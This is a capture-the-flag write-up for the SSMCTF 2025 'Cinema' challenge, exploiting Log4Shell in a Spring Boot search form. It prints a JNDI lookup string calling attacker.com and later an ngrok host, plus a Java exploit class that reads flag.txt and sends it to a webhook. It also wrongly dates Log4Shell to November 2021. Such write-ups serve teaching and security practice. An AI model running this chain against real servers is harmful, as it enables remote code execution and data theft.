# Cinema - SSMCTF 2025 (3 Solves)

> *"I'm looking at my local cinema for movie logs, but I can't find the MINECRAFT MOVIEEEE"*

A `src.zip` file is provided, containing the source code of the challenge website.

---

## 🔎 Analysis

The web application is built using **Java Spring Boot**. It provides a search feature on the homepage:

```html

<form action="/search" method="post">
    <input type="text" name="keyword" placeholder="Enter movie title..." required>
    <br>
    <button type="submit">Search</button>
</form>
```

---

### In `pom.xml`:

```xml

<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
```

When opening this file in `Intellij IDEA`, the IDE throws a warning:

```text
Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')
```

The version in use **2.14.1** appears to be a vulnerability. The **Log4Shell (CVE-2021-44228)** is an exploit that made
headlines in **November 2021**, when it was discovered to be used to hack Minecraft servers.

---

### In `SearchController.java`:

```java
@PostMapping("/search")
public String search(@RequestParam(required = false) String keyword, Model model) {
    logger.info("New search performed for keyword: " + keyword);

    model.addAttribute("searchPerformed", true);

    if (keyword == null || keyword.trim().isEmpty()) {
        model.addAttribute("message", "Please enter a search term.");
    } else {
        String lowerCaseKeyword = keyword.toLowerCase();
        List<Movie> filteredMovies = allMovies.stream()
                .filter(movie -> movie.getTitle().toLowerCase().contains(lowerCaseKeyword))
                .collect(Collectors.toList());

        model.addAttribute("movies", filteredMovies);
    }

    return "index";
}
``` 

This code logs the user-controlled `keyword` directly using **Log4j**, without any sanitisation.
We can send something like `${jndi:ldap://attacker.com/a}` to the server. When Log4j processes these strings,
it makes a remote lookup via JNDI, downloads and executes malicious Java classes, allowing **Remote Code Execution**.

---

## 🛠 Setup

We’ll use [**kozmer/log4j-shell-poc**](https://github.com/kozmer/log4j-shell-poc) as a base. However, this code is only
a proof-of-concept and only works locally so we need to modify it slightly to get the flag.

---

### 🔗 Create a Webhook

Go to [https://webhook.site](https://webhook.site) and copy your unique URL.
This URL will be used to **receive the contents of `flag.txt`**.

---

### 📝 Modify the Payload

In the script's `generate_payload()` function, modify the Java payload code to read `flag.txt` and send it to your webhook:

```java
program = """
import java.io.*;
import java.net.*;

public class Exploit {
    static {
        try {
            BufferedReader br = new BufferedReader(new FileReader("flag.txt"));
            String flag = br.readLine();
            br.close();

            URL u = new URL("https://<YOUR_WEBHOOK>.webhook.site?q=" + URLEncoder.encode(flag, "UTF-8"));
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("GET");
            c.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
"""
```

Replace `https://<YOUR_WEBHOOK>.webhook.site` with your actual webhook URL.

---

### 🔧 Change the Webserver URL

In the `ldap_server()` function, change the url variable because we will be using the localtunnel url instead of
`0.0.0.0:8000`:

```python
url = "http://{}/#Exploit".format(userip)
```

---

### 🌍 Expose the LDAP and Web Servers

#### A. Expose the HTTP Server:

Install and run [**localtunnel**](https://github.com/localtunnel/localtunnel):

```bash
lt --port 8000
```

This will give you a public HTTP address like `abc123.loca.lt`, which points to your local HTTP server.

#### B. Expose the LDAP Server:

Install [**ngrok**](https://ngrok.com) and run:

```bash
ngrok tcp 1389
```

This gives you a public TCP address like `0.tcp.ap.ngrok.io:12345`, which points to your local LDAP server.

---

### 🚀 Running the Code

Run the LDAP and Webserver:

```bash
python poc.py --userip <YOUR-LOCALTUNNEL-SUBDOMAIN>.loca.lt --webport 8000
```

Then, in the website's search box, enter this payload:

```
${jndi:ldap://0.tcp.ap.ngrok.io:12345/a}
```

The target server will:

1. Resolve the JNDI reference via the LDAP server.
2. Download and execute the `Exploit.class` from your web server.
3. Run the static initialiser block that reads `flag.txt` and sends it to your webhook.

---

## 🏁 Result

After entering the payload, your [webhook.site](https://webhook.site) will receive a request:

```
GET /?q=SSMCTF%7BwH0_l1k3_m1N3cR4ft%3F%7D
```

Decoded flag:

```
SSMCTF{wH0_l1k3_m1N3cR4ft?}
```
